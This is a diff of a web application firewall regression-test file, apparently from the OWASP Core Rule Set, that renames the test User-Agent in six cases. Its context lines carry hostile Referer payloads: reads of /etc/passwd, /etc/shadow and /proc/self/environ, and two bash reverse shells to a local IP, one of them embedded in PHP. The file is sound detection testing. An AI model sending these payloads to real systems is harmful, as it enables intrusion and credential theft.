@@ -101,7 +101,7 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: OWASP CRS test agent
               Referer: cat /etc/passwd
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
@@ -117,7 +117,7 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: OWASP CRS test agent
               Referer: /etc/shadow
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
@@ -133,7 +133,7 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: OWASP CRS test agent
               Referer: cat /proc/self/environ
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
@@ -148,7 +148,7 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: OWASP CRS test agent
               Referer: dd if=/etc/passwd of=/tmp/evil.sh bs=1 skip=22 count=9
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
@@ -164,7 +164,7 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: OWASP CRS test agent
               Referer: /bin/bash -c "sh -i>& /dev/tcp/172.17.0.1/54321 0>&1"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
@@ -180,7 +180,7 @@ tests:
             method: "GET"
             port: 80
             headers:
-              User-Agent: OWASP ModSecurity Core Rule Set
+              User-Agent: OWASP CRS test agent
               Referer: <?php `/bin/bash -c \'sh -i>&/dev/tcp/172.17.0.1/54321 0>&1\'`; ?>
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
